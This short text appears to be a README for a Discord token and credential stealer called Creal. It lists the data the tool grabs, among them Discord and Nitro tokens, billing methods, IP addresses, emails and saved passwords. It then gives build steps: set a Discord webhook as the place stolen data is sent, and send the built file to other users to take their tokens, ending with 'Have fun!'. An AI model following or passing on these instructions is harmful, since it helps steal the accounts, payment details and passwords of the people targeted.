...
- Grabbed discord token
- Grabbed phonenumber
- Grabbed riot games
- Grabbed Billing method
- Grabbed Nitro token
- Grabbed IP adress
- Grabbed E-Mail
- Grabbed HQ Friends
- Grabbed Accounts (passworts)
...
- First open Install and Install_python
- After that open Creal.exe (If there comes an error its no problem its just for Git!)
- After you opend Creal.exe you need to open Builder.bat
- Then you write your discord webhook (Where it will be send)
- After you opend the builder your data will be show in dist folder
- This data you will send to other user to get their tokens!
- Have fun!
